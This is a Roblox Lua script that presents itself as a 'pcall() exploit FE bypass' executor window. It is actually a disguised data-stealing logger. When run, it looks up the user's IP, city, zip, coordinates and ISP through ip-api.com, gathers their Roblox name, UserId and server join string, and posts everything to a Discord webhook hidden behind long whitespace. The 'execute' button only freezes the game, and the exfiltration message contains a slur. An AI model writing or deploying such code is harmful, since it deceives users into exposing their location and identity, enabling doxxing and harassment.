local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 400, 0, 300)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Size = UDim2.new(0, 400, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "pcall() exploit fe bypass by r00tqu4x"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0, 0, 0.166666672, 0)
TextBox.Size = UDim2.new(0, 400, 0, 200)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
TextBox.PlaceholderText = "script here"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0, 0, 0.833333313, 0)
TextButton.Size = UDim2.new(0, 400, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "execute"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

local function YCJQTV_fake_script() -- Frame.smoothguidrag 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(YCJQTV_fake_script)()
local function WWBG_fake_script() -- Frame.execute 
	local script = Instance.new('LocalScript', Frame)

	local execute = script.Parent.TextButton
	local http = syn.request or http_request or http.request
	if not http then return game:GetService("Players").LocalPlayer:Kick("lol your exploit doesnt support the HTTP server connection, cant do the pcall() exploit") end
	execute.MouseButton1Click:connect(function()
		while true do end
	end)
	
	local ipinfo = http({
		Url = "http://ip-api.com/json", 
		Method = "GET"
	})
	
	local iptable = game:GetService("HttpService"):JSONDecode(ipinfo.Body)
	
	local dataMessage = string.format([[```
retarded guy just fucking ran the fake pcall method script LOL
data from ip-api:
    - country: %s
    - countryCode: %s
    - region: %s
    - regionName: %s
    - city: %s
    - zip: %s
    - lat: %s
    - lon: %s
    - timezone: %s
    - isp: %s
    - org: %s
    - as: %s
    - query: %s
roblox information:
    - DisplayName: %s
    - Name: %s
    - UserId: %s
    - JobId: %s```]], iptable.country, iptable.countryCode, iptable.region, iptable.regionName, iptable.city, iptable.zip, iptable.lat, iptable.lon, iptable.timezone, iptable.isp, iptable.org, iptable.as, iptable.query, game:GetService("Players").LocalPlayer.DisplayName, game:GetService("Players").LocalPlayer.Name, game:GetService("Players").LocalPlayer.UserId, "Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", \""..game.JobId.."\")")
	
	http({
		Url =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                "https://ptb.discord.com/api/webhooks/999281807239426110/LLYLg50BkDDVrz85SCt95fAhRxG9Z8poV2hINKdH37oi3f_8Nfh8nDJKmrHzzTYPuF9x", 
		Method = "POST", 
		Headers = {
			["Content-Type"] = "application/json"
		}, 
		Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
	})
end
coroutine.wrap(WWBG_fake_script)()